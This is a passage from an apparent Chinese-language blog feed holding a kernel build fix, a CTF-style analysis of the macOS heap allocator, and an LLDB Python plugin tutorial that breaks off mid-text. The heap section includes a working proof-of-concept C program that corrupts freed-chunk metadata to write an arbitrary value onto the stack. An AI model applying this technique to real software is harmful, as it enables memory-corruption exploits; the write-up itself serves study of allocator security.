scripts&#x2F;mod&#x2F;modpost.o</span><br><span class="line">  HOSTCC  scripts&#x2F;mod&#x2F;sumversion.o</span><br><span class="line">  UPD     scripts&#x2F;mod&#x2F;devicetable-offsets.h</span><br><span class="line">  HOSTCC  scripts&#x2F;mod&#x2F;file2alias.o</span><br><span class="line">  HOSTLD  scripts&#x2F;mod&#x2F;modpost</span><br><span class="line">  CC      kernel&#x2F;bounds.s</span><br><span class="line">  CALL    scripts&#x2F;atomic&#x2F;check-atomics.sh</span><br><span class="line">&#x2F;bin&#x2F;sh: 1: bc: not found</span><br><span class="line">make[1]: *** [Kbuild:24: include&#x2F;generated&#x2F;timeconst.h] Error 127</span><br><span class="line">make[1]: *** Waiting for unfinished jobs....</span><br><span class="line">make: *** [Makefile:1148: prepare0] Error 2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install bc</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;编译arm64-aarch64-Kernel可能会遇到的问题&quot;&gt;编译arm64(aarch64) Kernel可能会遇到的问题&lt;/h3&gt;
&lt;h4 id=&quot;问题1&quot;&gt;问题1:&lt;/h4&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="qemu" scheme="http://yoursite.com/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>CTF-MacPwn分析</title>
    <link href="http://yoursite.com/2020/08/04/CTF-MacPwn%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/08/04/CTF-MacPwn%E5%88%86%E6%9E%90/</id>
    <published>2020-08-04T01:10:02.000Z</published>
    <updated>2020-08-04T06:34:36.003Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Mac程序的编译保护">Mac程序的编译保护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-fpie, -fno-pie &#x2F;&#x2F;关闭程序的pie保护</span><br></pre></td></tr></table></figure><h1>Heap</h1><h3 id="在MacOS中，堆块被分为三类去管理，第一类是tiny、small、large">在MacOS中，堆块被分为三类去管理，第一类是tiny、small、large</h3><h3 id="一般情况下，我们分析MacOS的Heap，源码是肯定要读的。虽然MacOS是闭源系统，但是大部分的代码是开源的。我们可以通过google直接搜索到MacOS相关的源码">一般情况下，我们分析MacOS的Heap，源码是肯定要读的。虽然MacOS是闭源系统，但是大部分的代码是开源的。我们可以通过google直接搜索到MacOS相关的源码</h3><h3 id="首先我们要读一下malloc、free的实现，源码如下">首先我们要读一下malloc、free的实现，源码如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void *</span><br><span class="line">malloc(size_t size) &#123;</span><br><span class="line">    void*retval;</span><br><span class="line">    retval &#x3D; malloc_zone_malloc(inline_malloc_default_zone(), size);</span><br><span class="line">    if (retval &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">errno &#x3D; ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    return retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">free(void *ptr) &#123;</span><br><span class="line">    malloc_zone_t*zone;</span><br><span class="line">    size_tsize;</span><br><span class="line">    if (!ptr)</span><br><span class="line">return;</span><br><span class="line">    zone &#x3D; find_registered_zone(ptr, &amp;size);</span><br><span class="line">    if (!zone) &#123;</span><br><span class="line">malloc_printf(&quot;*** error for object %p: pointer being freed was not allocated\n&quot;</span><br><span class="line">&quot;*** set a breakpoint in malloc_error_break to debug\n&quot;, ptr);</span><br><span class="line">malloc_error_break();</span><br><span class="line">if ((malloc_debug_flags &amp; (SCALABLE_MALLOC_ABORT_ON_CORRUPTION|SCALABLE_MALLOC_ABORT_ON_ERROR)))</span><br><span class="line">abort();</span><br><span class="line">    &#125; else if (zone-&gt;version &gt;&#x3D; 6 &amp;&amp; zone-&gt;free_definite_size)</span><br><span class="line">malloc_zone_free_definite_size(zone, ptr, size);</span><br><span class="line">    else</span><br><span class="line">        malloc_zone_free(zone, ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="发现malloc主要都是通过malloc-zone-malloc实现，于是我们去对应的函数看一下">发现malloc主要都是通过<code>malloc_zone_malloc</code>实现，于是我们去对应的函数看一下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void *</span><br><span class="line">malloc_zone_malloc(malloc_zone_t *zone, size_t size) &#123;</span><br><span class="line">    void*ptr;</span><br><span class="line">    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;&#x3D; malloc_check_start)) &#123;</span><br><span class="line">internal_check();</span><br><span class="line">    &#125;</span><br><span class="line">    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) &#123;</span><br><span class="line">return NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr &#x3D; zone-&gt;malloc(zone, size);</span><br><span class="line">    if (malloc_logger) malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);</span><br><span class="line">    return ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="其中使用了非常多次malloc-zone-t类型的变量，我们继续查看一下">其中使用了非常多次malloc_zone_t类型的变量，我们继续查看一下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#define MALLOC_ZONE_FN_PTR(fn) __ptrauth(ptrauth_key_process_independent_code, \</span><br><span class="line">FALSE, ptrauth_string_discriminator(&quot;malloc_zone_fn.&quot; #fn)) fn</span><br><span class="line"></span><br><span class="line">typedef struct _malloc_zone_t &#123;</span><br><span class="line">    &#x2F;* Only zone implementors should depend on the layout of this structure;</span><br><span class="line">    Regular callers should use the access functions below *&#x2F;</span><br><span class="line">    void*reserved1;&#x2F;* RESERVED FOR CFAllocator DO NOT USE *&#x2F;</span><br><span class="line">    void*reserved2;&#x2F;* RESERVED FOR CFAllocator DO NOT USE *&#x2F;</span><br><span class="line">    size_t (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); &#x2F;* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers *&#x2F;</span><br><span class="line">    void *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);</span><br><span class="line">    void *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); &#x2F;* same as malloc, but block returned is set to zero *&#x2F;</span><br><span class="line">    void *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); &#x2F;* same as malloc, but block returned is set to zero and is guaranteed to be page aligned *&#x2F;</span><br><span class="line">    void (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);</span><br><span class="line">    void *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);</span><br><span class="line">    void (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); &#x2F;* zone is destroyed and all memory reclaimed *&#x2F;</span><br><span class="line">    const char*zone_name;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Optional batch callbacks; these may be NULL *&#x2F;</span><br><span class="line">    unsigned(* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); &#x2F;* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) *&#x2F;</span><br><span class="line">    void(* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); &#x2F;* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process *&#x2F;</span><br><span class="line"></span><br><span class="line">    struct malloc_introspection_t* MALLOC_INTROSPECT_TBL_PTR(introspect);</span><br><span class="line">    unsignedversion;</span><br><span class="line">    </span><br><span class="line">    &#x2F;* aligned memory allocation. The callback may be NULL. Present in version &gt;&#x3D; 5. *&#x2F;</span><br><span class="line">    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);</span><br><span class="line">    </span><br><span class="line">    &#x2F;* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;&#x3D; 6.*&#x2F;</span><br><span class="line">    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);</span><br><span class="line"></span><br><span class="line">    &#x2F;* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;&#x3D; 8. *&#x2F;</span><br><span class="line">    size_t (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;&#x3D; 10.</span><br><span class="line"> * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has</span><br><span class="line"> * not yet been allocated. False negatives are not allowed.</span><br><span class="line"> *&#x2F;</span><br><span class="line">    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);</span><br><span class="line">&#125; malloc_zone_t;</span><br></pre></td></tr></table></figure><h3 id="从上面看到malloc-zone-t中有非常多的函数指针，而且在malloc中是通过zone-malloc直接通过zone里的函数指针直接调用。">从上面看到malloc_zone_t中有非常多的函数指针，而且在malloc中是通过zone-&gt;malloc直接通过zone里的函数指针直接调用。</h3><h3 id="如果有能力修改这里的指针，是否可以hook这个函数还得另外在说">如果有能力修改这里的指针，是否可以hook这个函数还得另外在说</h3><h3 id="看看是否有检查double-free">看看是否有检查double free</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">void initIO()&#123;</span><br><span class="line">setbuf(stdin,0);</span><br><span class="line">setbuf(stdout,0);</span><br><span class="line">setbuf(stderr,0);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">initIO();</span><br><span class="line">unsigned long long * ptr1 &#x3D; malloc(0x18);</span><br><span class="line">free(ptr1);</span><br><span class="line">free(ptr1);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行结果如下">运行结果如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">easyheap(72928,0x11be9adc0) malloc: *** error for object 0x7fb070c058a0: pointer being freed was not allocated</span><br><span class="line">easyheap(72928,0x11be9adc0) malloc: *** set a breakpoint in malloc_error_break to debug</span><br><span class="line">zsh: abort      .&#x2F;easyheap</span><br></pre></td></tr></table></figure><p>MacOS堆块可能是非连续分布，也可能是连续分布。这里存在概率问题<br>如果是连续分布就可以触发堆溢出，但是MacOS的unlink攻击只能实现任意地址写任意<br>指针。<br>表达式表示如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">标记 &#x3D; cookies &lt;&lt; (64 - 4) | (free指针 &gt;&gt; 4)</span><br><span class="line">例如 0xE00007fabcdef123</span><br></pre></td></tr></table></figure><h3 id="POC如下">POC如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">void initIO()&#123;</span><br><span class="line">setbuf(stdin,0);</span><br><span class="line">setbuf(stdout,0);</span><br><span class="line">setbuf(stderr,0);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">unsigned long long target[0x10];</span><br><span class="line">int i &#x3D; 0;</span><br><span class="line">for(i &#x3D; 0;i&lt;0x10;i++)&#123;</span><br><span class="line">target[i] &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">initIO();</span><br><span class="line">unsigned long long * ptr1 &#x3D; malloc(0x40);</span><br><span class="line">unsigned long long * ptr2 &#x3D; malloc(0x40);</span><br><span class="line">unsigned long long * ptr3 &#x3D; malloc(0x40);</span><br><span class="line">unsigned long long * ptr4 &#x3D; malloc(0x40);</span><br><span class="line">unsigned long long * ptr5 &#x3D; malloc(0x40);</span><br><span class="line">unsigned long long * ptr6 &#x3D; malloc(0x40);</span><br><span class="line">ptr1[0] &#x3D; 0x1111111111111111;</span><br><span class="line">ptr2[0] &#x3D; 0x2222222222222222;</span><br><span class="line">ptr3[0] &#x3D; 0x3333333333333333;</span><br><span class="line">ptr4[0] &#x3D; 0x4444444444444444;</span><br><span class="line">ptr5[0] &#x3D; 0x5555555555555555;</span><br><span class="line">ptr6[0] &#x3D; 0x6666666666666666;</span><br><span class="line">free(ptr1);</span><br><span class="line">free(ptr3);</span><br><span class="line">free(ptr5);</span><br><span class="line">malloc(0x40);</span><br><span class="line">ptr3[0] &#x3D; 0xdeadbeefdeadbeef;</span><br><span class="line">ptr3[1] &#x3D; 0xA000000000000000 | (unsigned long long)target&gt;&gt;4;</span><br><span class="line">malloc(0x40);</span><br><span class="line">        for(i &#x3D; 0;i&lt;0x10;i++)&#123;</span><br><span class="line">                printf(&quot;target[i] &#x3D; %p\n&quot;,target[i]);</span><br><span class="line">        &#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="因为cookies本身是爆破的，只有当cookies为A时才可以打通，运行结果如下">因为cookies本身是爆破的，只有当cookies为A时才可以打通，运行结果如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">target[i] &#x3D; 0xdeadbeefdeadbeef</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br><span class="line">target[i] &#x3D; 0x0</span><br></pre></td></tr></table></figure><h3 id="发现stack内数组的值被篡改">发现stack内数组的值被篡改</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Mac程序的编译保护&quot;&gt;Mac程序的编译保护&lt;/h3&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="MacOS" scheme="http://yoursite.com/tags/MacOS/"/>
    
  </entry>
  
  <entry>
    <title>MacOS-LLDB插件开发</title>
    <link href="http://yoursite.com/2020/08/04/MacOS-LLDB%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    <id>http://yoursite.com/2020/08/04/MacOS-LLDB%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/</id>
    <published>2020-08-04T01:07:02.000Z</published>
    <updated>2020-08-04T03:28:31.635Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Python接口">Python接口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lldb.llvm.org&#x2F;python_reference&#x2F;index.html</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;reverse.put.as&#x2F;2019&#x2F;11&#x2F;19&#x2F;how-to-make-lldb-a-real-debugger&#x2F;</span><br></pre></td></tr></table></figure><h3 id="在lldb中导入插件">在lldb中导入插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command script import &#x2F;plugin.py</span><br></pre></td></tr></table></figure><h2 id="初识-lldb-init-module接口">初识__lldb_init_module接口</h2><hr><h3 id="当一个python脚本被lldb导入的时候，lldb会调用这个接口。">当一个python脚本被lldb导入的时候，lldb会调用这个接口。</h3><h3 id="一般情况下，我们编写一个python脚本负责把所有的python脚本引入进来，我个人称为loader脚本">一般情况下，我们编写一个python脚本负责把所有的python脚本引入进来，我个人称为loader脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def __lldb_init_module(debugger,dict):</span><br><span class="line">        print(&quot;Import Plugin Success!&quot;)</span><br></pre></td></tr></table></figure><h3 id="lldb添加的每一个我们都要写一个脚本和它对应，添加命令的代码如下">lldb添加的每一个我们都要写一个脚本和它对应，添加命令的代码如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command script add &#123;command_name&#125; -f &#123;python_script_name&#125;.&#123;function_name or class_name&#125;</span><br><span class="line">&#x2F;&#x2F; 以上大括号里的，都是要自己填充的</span><br></pre></td></tr></table></figure><h3 id="接下来就是实现命令具体的内容了">接下来就是实现命令具体的内容了</h3><h4 id="一共有两种定义命令具体内容的办法，一是通过函数，而是通过类。很明显通过类会更加的具体、完整。">一共有两种定义命令具体内容的办法，一是通过函数，而是通过类。很明显通过类会更加的具体、完整。</h4><h4 id="类的定义方法：">类的定义方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class CommandObjectType:</span><br><span class="line">    def __init__(self, debugger, session_dict):</span><br><span class="line">        this call should initialize the command with respect to the command interpreter for the passed-in debugger</span><br><span class="line">    def __call__(self, debugger, command, exe_ctx, result):</span><br><span class="line">        this is the actual bulk of the command, akin to Python command functions</span><br><span class="line">    def get_short_help(self):</span><br><span class="line">        this call should return the short help text for this command[1]</span><br><span class="line">    def get_long_help(self):</span><br><span class="line">        this call should return the long help text for this command[1]</span><br></pre></td></tr></table></figure><h4 id="函数定义方法：">函数定义方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def function_name(debugger, command, exe_ctx, result, internal_dict):</span><br><span class="line">pass</span><br></pre></td></tr></table></figure><h3 id="输出指令命令之后数据">输出指令命令之后数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result.AppendMessage(&quot;deadbeef&quot;)</span><br></pre></td></tr></table></figure><h2 id="lldb-debugger类">lldb.debugger类</h2><hr><h3 id="lldb-debugger-GetSelectedTarget">lldb.debugger.GetSelectedTarget()</h3><h2 id="lldb-SBTarget">lldb.SBTarget</h2><hr><h3 id="获取Target">获取Target</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lldb.debugger.getSelectedTarget()</span><br></pre></td></tr></table></figure><h3 id="获取被调试文件的目录">获取被调试文件的目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lldb.debugger.GetSelectedTarget().executable.fullpath</span><br></pre></td></tr></table></figure><h2 id="lldb-SBModule">lldb.SBModule</h2><hr><h3 id="获取架构、动态链接库目录">获取架构、动态链接库目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i in lldb.debugger.GetSelectedTarget().module_iter():</span><br><span class="line"> print(i)</span><br></pre></td></tr></table></figure><h3 id="获取程序运行所有module的uuid，包括动态链接库">获取程序运行所有module的uuid，包括动态链接库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i in lldb.debugger.GetSelectedTarget().module_iter():</span><br><span class="line"> print(i.uuid)</span><br></pre></td></tr></table></figure><h3 id="获得target的module的section">获得target的module的section</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fullpath &#x3D; getTarget().executable.fullpath</span><br><span class="line">modules &#x3D; getTarget().module[fullpath]</span><br><span class="line">for i in modules.section_iter():</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><h3 id="获取所有module的目录">获取所有module的目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for module in getTarget().module_iter():</span><br><span class="line">print(module.file)</span><br></pre></td></tr></table></figure><h3 id="获取某一个模块的路径">获取某一个模块的路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for module in getTarget().module_iter():</span><br><span class="line">print(module.file)</span><br></pre></td></tr></table></figure><h2 id="lldb-SBSymbol">lldb.SBSymbol</h2><hr><h3 id="获取所有的symols-结构体、函数名等">获取所有的symols(结构体、函数名等)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">for i in getTarget().module_iter():</span><br><span class="line"> for symbol in i:</span><br><span class="line">  print(symbol.GetName())</span><br><span class="line">  </span><br><span class="line">输出结果如下</span><br><span class="line">[0x0000000000000000-0x0000000100000000) hello.__PAGEZERO</span><br><span class="line">[0x0000000100000000-0x0000000100001000) hello.__TEXT</span><br><span class="line">[0x0000000100001000-0x0000000100002000) hello.__DATA_CONST</span><br><span class="line">[0x0000000100002000-0x0000000100003000) hello.__DATA</span><br><span class="line">[0x0000000100003000-0x0000000100008000) hello.__LINKEDIT  </span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">## lldb.SBSection</span><br><span class="line">---</span><br><span class="line">### 获取某一个模块所有的区段地址和名称</span><br></pre></td></tr></table></figure><p>for module in getTarget().module_iter():<br>for section in module.get_sections_array():<br>print(section.GetLoadAddress(getTarget()))<br>print(section.GetName())<br>运行结果：<br>/usr/lib/system/libsystem_trace.dylib<br>140734928015360<br>__TEXT<br>140735571328992<br>__DATA<br>140736423665664<br>__LINKEDIT<br>/usr/lib/system/libunwind.dylib<br>140734928113664<br>__TEXT<br>140735571336960<br>__DATA<br>140736423665664<br>__LINKEDIT<br>……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 查看区段可读可写可执行权限</span><br></pre></td></tr></table></figure><p>for module in getTarget().module_iter():<br>for section in module.get_sections_array():<br>print(section.GetPermissions())</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## lldb.SBFrame</span><br><span class="line">### 获取寄存器</span><br></pre></td></tr></table></figure><pre><code>    registers = frame.GetRegisters()    for value in registers:            for child in value:                    print(child.GetValue())                    print(child.GetName())</code></pre><p>结果如下：<br>0x0000000000000000<br>rax<br>0x0000000000000000<br>rbx<br>0x00007ffeefbff550<br>rcx<br>0x44831090291d00e8<br>……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 官方文档解释 </span><br><span class="line">#### SBModule Python Help</span><br></pre></td></tr></table></figure><p>|  SBModule supports symbol iteration, for example,<br>|<br>|      for symbol in module:<br>|          name = symbol.GetName()<br>|          saddr = symbol.GetStartAddress()<br>|          eaddr = symbol.GetEndAddress()<br>Help on SBModule in module lldb object:<br>class SBModule(builtins.object)<br>|  SBModule(<em>args)<br>|<br>|  Represents an executable image and its associated object and symbol files.<br>|<br>|  The module is designed to be able to select a single slice of an<br>|  executable image as it would appear on disk and during program<br>|  execution.<br>|<br>|  You can retrieve SBModule from SBSymbolContext, which in turn is available<br>|  from SBFrame.<br>|<br>|  SBModule supports symbol iteration, for example,<br>|<br>|      for symbol in module:<br>|          name = symbol.GetName()<br>|          saddr = symbol.GetStartAddress()<br>|          eaddr = symbol.GetEndAddress()<br>|<br>|  and rich comparison methods which allow the API program to use,<br>|<br>|      if thisModule == thatModule:<br>|          print(‘This module is the same as that module’)<br>|<br>|  to test module equality.  A module also contains object file sections, namely<br>|  SBSection.  SBModule supports section iteration through section_iter(), for<br>|  example,<br>|<br>|      print(‘Number of sections: %d’ % module.GetNumSections())<br>|      for sec in module.section_iter():<br>|          